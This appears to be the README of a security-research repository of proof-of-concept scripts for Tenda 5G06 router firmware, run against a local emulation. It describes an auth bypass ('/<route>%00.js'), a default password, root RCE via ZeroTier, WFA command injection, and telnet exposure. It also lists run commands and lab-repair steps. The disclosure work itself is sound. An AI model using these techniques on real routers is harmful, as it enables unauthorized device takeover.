# Tenda 5G06 Standalone PoCs

These PoCs target the local emulated firmware by default. Each script is
standalone and uses only the Python standard library, except
`poc_auth_bypass_download_cfg.py` shells out to the local `openssl` CLI when
decoding the downloaded config backup.

Default targets:

```text
native httpd: http://127.0.0.1:18080
native container: tenda-b104-native-httpd
rc.d/WFA target: auto-discovered Docker IP, tcp/9000 for wfa_ca
direct WFA DUT target: auto-discovered Docker IP, tcp/8000 for wfa_dut
rc.d container: auto-discovered by tenda-b104-rcd-procd* name prefix
```

## Auth Bypass

| PoC | Finding | Severity | Impact |
| --- | --- | --- | --- |
| `poc_zerotier_unauth_rce.py` | F01: ZeroTier auth-bypass RCE | Critical | Executes attacker-supplied shell script as root. |
| `poc_auth_bypass_telnet.py` | F02: NUL-suffix auth bypass | Critical | Starts `telnetd` and exposes tcp/23. |
| `poc_auth_bypass_ate.py` | F02: NUL-suffix auth bypass | Critical | Starts manufacturing/ATE service. |
| `poc_auth_bypass_download_cfg.py` | F03: Config backup disclosure/decode | High | Downloads and decrypts protected config backup. |
| `poc_auth_bypass_download_log.py` | F04: Log archive disclosure | High | Downloads protected logs. |
| `poc_auth_bypass_getmodules.py` | F02: NUL-suffix auth bypass | Critical | Reaches protected read API. |
| `poc_auth_bypass_setmodules.py` | F02: NUL-suffix auth bypass | Critical | Reaches protected write API. |

```bash
python3 pocs/poc_auth_bypass_telnet.py
python3 pocs/poc_auth_bypass_ate.py
python3 pocs/poc_auth_bypass_download_cfg.py
python3 pocs/poc_auth_bypass_download_log.py
python3 pocs/poc_auth_bypass_getmodules.py
python3 pocs/poc_auth_bypass_setmodules.py
python3 pocs/poc_zerotier_unauth_rce.py
```

The auth-bypass primitive is:

```text
/<protected-route>%00.js
```

`poc_auth_bypass_download_cfg.py` saves the encrypted backup and, by default,
decrypts and extracts it to `poc_out/download_cfg_decoded/` using the
firmware's static AES-128-ECB key. Pass `--no-decode` to only save the raw
download.

The highest-impact PoC is `poc_zerotier_unauth_rce.py`, which demonstrates
unauthenticated shell-script execution through the native ZeroTier helper when
the firmware can reach the PoC HTTP server. In this emulation, the native
httpd shim returns connected network status so the production network-gated
helper path is reachable.

Manual telnet validation:

```bash
python3 pocs/poc_auth_bypass_telnet.py --no-cleanup
telnet 172.17.0.3 23
```

Validated result:

```text
Connected to 172.17.0.3.
5ec0d2e4ac27 login:
```

If the connection succeeds and then immediately closes, check the QEMU/chroot
pseudo-terminal setup. In this lab, BusyBox `telnetd` needed `/dev/ptmx` inside
the firmware rootfs and a writable `devpts` `ptmx` node:

```bash
docker exec tenda-b104-native-httpd /bin/sh -lc '
pid=$(ps | awk "/[h]ttpd/{print \$1; exit}")
root=$(readlink /proc/$pid/root)
[ -e "$root/dev/ptmx" ] || ln -s pts/ptmx "$root/dev/ptmx"
mount -o remount,mode=620,ptmxmode=666 "$root/dev/pts" 2>/dev/null || true
'
```

## Session/CSRF Weaknesses

| PoC | Finding | Severity | Impact |
| --- | --- | --- | --- |
| `poc_cookie_missing_security_flags.py` | F06: cookie hardening missing | Medium | Session cookie lacks `HttpOnly`, `Secure`, `SameSite`. |
| `poc_csrf_missing_referer_ate.py` | F06: weak CSRF guard | Medium | Authenticated no-referer request starts ATE service. |

```bash
python3 pocs/poc_cookie_missing_security_flags.py
python3 pocs/poc_csrf_missing_referer_ate.py
```

These require the configured login password. The default is `Tenda_888888`.

## WFA/Sigma Command Injection

| PoC | Finding | Severity | Impact |
| --- | --- | --- | --- |
| `poc_wfa_direct_dut_cmd_injection.py` | F05: direct `wfa_dut` command injection | High | Sends raw TLV directly to stock `wfa_dut:8000`; no `wfa_ca` required. |
| `poc_wfa_sta_get_mac_cmd_injection.py` | F05: Sigma command injection | High | Injects through `sta_get_mac_address`. |
| `poc_wfa_sta_get_ip_config_cmd_injection.py` | F05: Sigma command injection | High | Injects through `sta_get_ip_config`. |
| `poc_wfa_sta_set_ip_config_cmd_injection.py` | F05: Sigma command injection | High | Injects through `sta_set_ip_config`. |

```bash
python3 pocs/poc_wfa_sta_get_mac_cmd_injection.py
python3 pocs/poc_wfa_sta_get_ip_config_cmd_injection.py
python3 pocs/poc_wfa_sta_set_ip_config_cmd_injection.py
python3 pocs/poc_wfa_direct_dut_cmd_injection.py
```

The first three target the close-to-`rc.d` container where `wfa_ca` listens on
`9000/tcp`. `poc_wfa_direct_dut_cmd_injection.py` sends the raw little-endian
WFA TLV directly to stock-started `wfa_dut` on `8000/tcp`, proving `wfa_ca` is
not required if the DUT port is reachable.

If a reverse-shell PoC or long-running injected command leaves `wfa_dut`
wedged, restart just the WFA pair before rerunning:

```bash
docker exec tenda-b104-rcd-procd-20260421_214544 sh -lc '
pid=$(ps | awk '\''/[w]fa_dut/{print $1; exit}'\'')
ROOT=$(readlink /proc/$pid/root)
IP=$(hostname -i | awk '{print $1}')
for p in $(ps | awk '\''/[w]fa_ca|[w]fa_dut/{print $1}'\''); do kill -9 "$p" 2>/dev/null || true; done
sleep 1
chroot "$ROOT" /sbin/wfa_dut "ra0;rai0" 8000 >"$ROOT/tmp/rcd-procd/wfa_dut_poc.log" 2>&1 &
sleep 1
env WFA_ENV_AGENT_IPADDR="$IP" WFA_ENV_AGENT_PORT=8000 \
  chroot "$ROOT" /sbin/wfa_ca br-lan 9000 >"$ROOT/tmp/rcd-procd/wfa_ca_poc.log" 2>&1 &
'
```

See `../POC_RESULTS.md` for validation evidence.

## Safety

Scripts refuse public/non-private targets unless `--allow-nonlocal` is passed.
The service-spawning PoCs clean up spawned daemons by default. Use
`--no-cleanup` only when you intentionally want to inspect the process manually.
